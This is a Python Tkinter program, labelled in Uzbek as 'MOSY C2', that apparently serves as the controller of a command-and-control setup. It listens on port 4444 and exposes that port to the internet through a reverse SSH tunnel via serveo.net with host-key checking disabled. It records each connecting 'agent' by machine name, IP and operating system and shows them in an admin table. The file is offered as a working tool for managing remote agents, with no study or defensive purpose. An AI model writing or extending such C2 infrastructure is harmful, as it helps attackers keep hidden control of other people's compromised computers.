import socket
import threading
import subprocess
import tkinter as tk
from tkinter import ttk, messagebox
from PIL import Image, ImageTk

PORT = 4444

class AdminPanel:
    def __init__(self, root):
        self.root = root
        self.root.title("MOSY C2 - Global Avtomatlashgan Boshqaruv Markazi")
        self.root.geometry("950x550")
        
        # Holat va Global manzil yozuvi
        self.status_label = tk.Label(root, text="Global tizim va server ishga tushirilmoqda...", font=("Arial", 11, "bold"), fg="blue")
        self.status_label.pack(pady=10)
        
        # Jadval
        self.tree = ttk.Treeview(root, columns=("ID", "PC_Name", "IP", "OS", "Holati"), show="headings", height=12)
        self.tree.heading("ID", text="#")
        self.tree.heading("PC_Name", text="Kompyuter Nomi")
        self.tree.heading("IP", text="Tarmoq Manzili")
        self.tree.heading("OS", text="Tizim (OS)")
        self.tree.heading("Holati", text="Holati")
        
        self.tree.column("ID", width=40)
        self.tree.column("PC_Name", width=180)
        self.tree.column("IP", width=150)
        self.tree.column("OS", width=180)
        self.tree.column("Holati", width=150)
        self.tree.pack(pady=10, padx=20, fill=tk.BOTH, expand=True)
        
        # Tugmalar
        btn_frame = tk.Frame(root)
        btn_frame.pack(pady=10)
        
        self.btn_refresh = tk.Button(btn_frame, text="🔄 Yangilash (Refresh)", bg="orange", fg="black", font=("Arial", 10, "bold"), command=self.refresh_agents)
        self.btn_refresh.pack(side=tk.LEFT, padx=10)
        
        self.agents_data = []
        self.global_host = "127.0.0.1"
        self.global_port = PORT

        # 1. Serverni va Global Tunnelni avtomatik ishga tushirish
        threading.Thread(target=self.start_backend_automatically, daemon=True).start()

    def start_backend_automatically(self):
        # A) Serverni o'zimizning ichki oqimda ishga tushiramiz (CMD ochib o'tirmasdan fonda ishlaydi)
        threading.Thread(target=self.run_local_server, daemon=True).start()
        
        # B) Dunyo bo'ylab ulanish uchun Serveo tunnelini CMD (alohida qora oyna) orqali ochamiz
        try:
            # Windows CMD oynasida tunnelni chiqarish
            self.tunnel_proc = subprocess.Popen(
                f"start cmd /k ssh -o StrictHostKeyChecking=no -R 0:localhost:{PORT} serveo.net",
                shell=True
            )
            self.status_label.config(text="Global Server va Tunnel CMD da ishga tushdi! Agentlar uchun Serveo manzilini kiriting.", fg="green")
        except Exception as e:
            self.status_label.config(text=f"Tunnelni ochishda xato: {str(e)}", fg="red")

    def run_local_server(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', PORT))
        server.listen(50)
        
        while True:
            try:
                client_socket, addr = server.accept()
                client_socket.settimeout(2.0)
                check_type = client_socket.recv(1024).decode('utf-8', errors='ignore')
                client_socket.settimeout(None)
                
                if check_type.startswith("ADMIN_REQ"):
                    threading.Thread(target=self.handle_admin_connection, args=(client_socket,), daemon=True).start()
                else:
                    if "|" in check_type:
                        pc_name, os_info = check_type.split("|", 1)
                    else:
                        pc_name, os_info = "Noma'lum", "Noma'lum"
                    
                    agent_id = f"{pc_name}_{addr[0]}"
                    # Global ro'yxatga qo'shish
                    global_agents[agent_id] = {"socket": client_socket, "addr": addr, "pc_name": pc_name, "os": os_info}
            except:
                pass

    def handle_admin_connection(self, admin_socket):
        try:
            active_agents = []
            for aid, info in global_agents.items():
                active_agents.append(f"{info['pc_name']}|{info['addr'][0]}|{info['os']}")
            response = "___".join(active_agents) if active_agents else "EMPTY"
            admin_socket.sendall(response.encode('utf-8'))
        except:
            pass
        finally:
            admin_socket.close()

    def refresh_agents(self):
        for row in self.tree.get_children():
            self.tree.delete(row)
        self.agents_data.clear()
        
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(('127.0.0.1', PORT))
            s.sendall("ADMIN_REQ_LIST".encode('utf-8'))
            
            response = s.recv(4096).decode('utf-8', errors='ignore')
            s.close()
            
            if response and response != "EMPTY":
                parts = response.split("___")
                for idx, item in enumerate(parts, 1):
                    if "|" in item:
                        pc_name, ip, os_info = item.split("|", 2)
                        self.tree.insert("", tk.END, values=(idx, pc_name, ip, os_info, "Online (Faol)"))
                        self.agents_data.append({"pc_name": pc_name, "ip": ip})
                        
                self.status_label.config(text=f"Global tarmoqda topildi: {len(self.agents_data)} ta agent", fg="green")
            else:
                self.status_label.config(text="Hozircha global tarmoqda faol agentlar yo'q", fg="orange")
        except Exception as e:
            self.status_label.config(text=f"Xatolik: {str(e)}", fg="red")

# Serverdagi global agentlar bazasi
global_agents = {}

if __name__ == "__main__":
    root = tk.Tk()
    app = AdminPanel(root)
    root.mainloop()